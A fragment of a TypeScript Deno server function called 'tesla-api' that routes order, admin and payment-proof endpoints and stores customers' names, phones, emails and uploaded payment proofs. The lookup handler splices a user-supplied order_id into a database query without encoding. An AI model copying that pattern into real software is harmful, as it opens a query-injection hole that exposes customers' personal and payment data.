  const orderId = url.searchParams.get("order_id");
  const sessionToken = url.searchParams.get("session");
  
  if (!orderId && !sessionToken) {
    // Try session-based lookup
    const user = await getSessionUser(sessionToken || "");
    if (!user) return json({ error: "Missing order_id or session" }, 400);
    // Find latest proof for this user's orders
    const r = await fetch(REST + "/payment_proofs?select=*&order_id=like.TSLA-%25&order=created_at.desc&limit=1", { headers: SB_HEADERS });
    if (!r.ok) return json({ proofs: [] });
    return json({ proofs: await r.json() });
  }
  
  const r = await fetch(REST + "/payment_proofs?select=*&order_id=eq." + orderId + "&order=created_at.desc&limit=5", { headers: SB_HEADERS });
  if (!r.ok) return json({ proofs: [] });
  return json({ proofs: await r.json() });
}

async function handlePaymentSubmit(req: Request) {
  let body: Record<string, unknown>;
  try { body = await req.json(); } catch { return json({ error: "Invalid request" }, 400); }
  
  const paymentMethod = String(body.paymentMethodName || body.paymentMethod || body.payment_method || "Unknown");
  const orderId = String(body.orderId || body.order_id || "ORD-" + hexRandom(4).toUpperCase());
  const customerName = String(body.customerName || "");
  const amount = String(body.amount || body.deliveryFee || "");
  const sessionToken = String(body.sessionToken || "");

  // Build proof_urls array from all available sources
  let proofUrls: string[] = [];
  if (body.proof_urls && Array.isArray(body.proof_urls)) {
    proofUrls = (body.proof_urls as string[]).filter((u: string) => u && u.length > 0);
  }
  const proofData = body.proofData || body.proof_url || "";
  const singleUrl = typeof proofData === 'string' ? proofData : (typeof proofData === 'object' ? JSON.stringify(proofData) : "");
  if (singleUrl && !proofUrls.includes(singleUrl)) {
    proofUrls.unshift(singleUrl);
  }
  const backUrl = String(body.proof_back_url || "");
  if (backUrl && !proofUrls.includes(backUrl)) {
    proofUrls.push(backUrl);
  }

  // Store customer info as denormalized columns for admin display
  const customerNameStr = String(body.customer_name || body.customerName || "");
  const customerPhoneStr = String(body.customer_phone || body.phone || "");
  const customerEmailStr = String(body.customer_email || body.email || "");

  // Only include columns that exist in the payment_proofs schema
  const proof: Record<string, unknown> = {
    order_id: orderId,
    payment_method: paymentMethod,
    proof_url: proofUrls.length > 0 ? proofUrls[0] : (typeof proofData === 'string' ? proofData : JSON.stringify(proofData || "")),
    proof_urls: JSON.stringify(proofUrls),
    proof_type: "image",
    amount: amount,
    status: "pending",
    user_id: null,
    customer_name: customerNameStr || null,
    customer_phone: customerPhoneStr || null,
    customer_email: customerEmailStr || null,
    created_at: new Date().toISOString(),
  };
  if (proofUrls.length > 1) proof.proof_back_url = proofUrls[proofUrls.length - 1];
  
  // Store in payment_proofs table if it exists
  const { data, error } = await dbInsert("payment_proofs", proof, "id,created_at");
  if (error) {
    console.error("Payment submit: insert failed:", error);
    // Try fallback to admin_settings
    const existingR = await fetch(REST + "/admin_settings?select=key,value&key=eq.payment_proofs_backup&limit=1", { headers: SB_HEADERS });
    let proofs: unknown[] = [];
    if (existingR.ok) {
      const rows = await existingR.json();
      const val = rows[0]?.value as { items?: unknown[] } | undefined;
      if (val?.items) proofs = val.items;
    }
    proofs.push(proof);
    const backupR = await fetch(REST + "/admin_settings?key=eq.payment_proofs_backup", {
      method: existingR.ok ? "PATCH" : "POST",
      headers: { ...SB_HEADERS, Prefer: "return=minimal" },
      body: JSON.stringify({ key: "payment_proofs_backup", value: { items: proofs } }),
    });
    if (!backupR.ok && !existingR.ok) {
      const insR = await fetch(REST + "/admin_settings", {
        method: "POST",
        headers: { ...SB_HEADERS, Prefer: "return=minimal" },
        body: JSON.stringify({ key: "payment_proofs_backup", value: { items: proofs } }),
      });
      if (!insR.ok) return json({ error: "Failed to save payment proof" }, 500);
    }
  }
  
  return json({ success: true, orderId, status: "pending" });
}

// ── MAIN ──────────────────────────────────────────────────────────────────────
Deno.serve(async (req) => {
  if (req.method === "OPTIONS") return new Response(null, { status: 204, headers: CORS });

  const url = new URL(req.url);
  const route = url.pathname.replace(/^\/(functions\/v1\/)?tesla-api/, "").replace(/\/$/, "") || "/";

  console.log("Route:", route, "| Method:", req.method);

  try {
    if (route === "/api/health" || route === "/health" || route === "") return await handleHealth();
    if (route === "/api/entry" && req.method === "POST") return await handleEntry(req);
    if (route === "/api/verify" && req.method === "GET") return await handleVerify(req);
    if (route === "/api/resend" && req.method === "POST") return await handleResend(req);
    if (route === "/api/login" && req.method === "POST") return await handleLogin(req);
    if (route === "/api/session" && req.method === "GET") return await handleSession(req);
    if (route === "/api/order" && req.method === "POST") return await handleOrder(req);
    const trackM = route.match(/^\/api\/order\/tracking\/([^/]+)$/);
    if (trackM && req.method === "GET") return await handleTracking(trackM[1]);
    const orderM = route.match(/^\/api\/order\/([^/]+)$/);
    if (orderM && req.method === "GET") return await handleOrderLookup(orderM[1]);
    // Admin routes — all require a valid admin session EXCEPT login
    if (route === "/api/admin/auth" && req.method === "POST") return await handleAdminAuth(req);
    if (route === "/api/admin/change-password" && req.method === "POST") return await adminGuard(req, () => handleAdminChangePassword(req));
    if (route === "/api/admin/users" && req.method === "GET") return await adminGuard(req, () => handleAdminUsers(req));
    if (route === "/api/admin/users/delete" && req.method === "POST") return await adminGuard(req, () => handleAdminDeleteUser(req));
    // Public delivery-fee settings for customer-facing pages (no auth required)
    if (route === "/api/delivery-fees" && req.method === "GET") return await handlePublicDeliveryFees();
    if (route === "/api/admin/settings" && req.method === "GET") return await adminGuard(req, () => handleAdminGetSettings());
    if (route === "/api/admin/settings" && req.method === "POST") return await adminGuard(req, () => handleAdminSaveSettings(req));
    if (route === "/api/admin/orders" && req.method === "GET") return await adminGuard(req, () => handleAdminOrders(req));
    if (route === "/api/admin/stats" && req.method === "GET") return await adminGuard(req, () => handleAdminGetStats());
    // Payment methods (public read + admin manage) and payment proofs
    if (route === "/api/payment-methods" && req.method === "GET") return await handlePublicPaymentMethods();
    if (route === "/api/admin/payment-methods" && req.method === "GET") return await adminGuard(req, () => handleAdminGetPaymentMethods());
    if (route === "/api/admin/payment-methods" && req.method === "POST") return await adminGuard(req, () => handleAdminSavePaymentMethods(req));
    if (route === "/api/admin/payment-methods/upsert" && req.method === "POST") return await adminGuard(req, () => handleAdminUpsertPaymentMethod(req));
    const pmMatch = route.match(/^\/api\/admin\/payment-methods\/([^/]+)$/);
    if (pmMatch && req.method === "DELETE") return await adminGuard(req, () => handleAdminDeletePaymentMethod(decodeURIComponent(pmMatch[1])));
    if (pmMatch && req.method === "PUT") return await adminGuard(req, () => handleAdminUpsertPaymentMethod(req));
    // Payment submission from customer
    if (route === "/api/payment/submit" && req.method === "POST") return await handlePaymentSubmit(req);
    if (route === "/api/payment-proof" && req.method === "POST") return await handlePaymentSubmit(req);
    if (route === "/api/payment/status" && req.method === "GET") return await handleGetPaymentStatus(req);
    // Admin payment proof management
    if (route === "/api/admin/payment-proofs" && req.method === "GET") return await adminGuard(req, () => handleAdminGetPaymentProofs());
    if (route === "/api/admin/payment-proofs/submit" && req.method === "POST") return await adminGuard(req, () => handleSubmitPaymentProof(req));
    if (route === "/api/admin/payment-proofs/approve" && req.method === "POST") return await adminGuard(req, () => handleAdminApproveProof(req));
    if (route === "/api/admin/payment-proofs/reject" && req.method === "POST") return await adminGuard(req, () => handleAdminRejectProof(req));
    if (route === "/api/admin/payment-proofs/delete" && req.method === "POST") return await adminGuard(req, () => handleAdminDeleteProof(req));
    return json({ error: "Not found." }, 404);
  } catch (err) {
    console.error("Unhandled error:", err);
    return json({ error: "Internal server error." }, 500);
  }
});
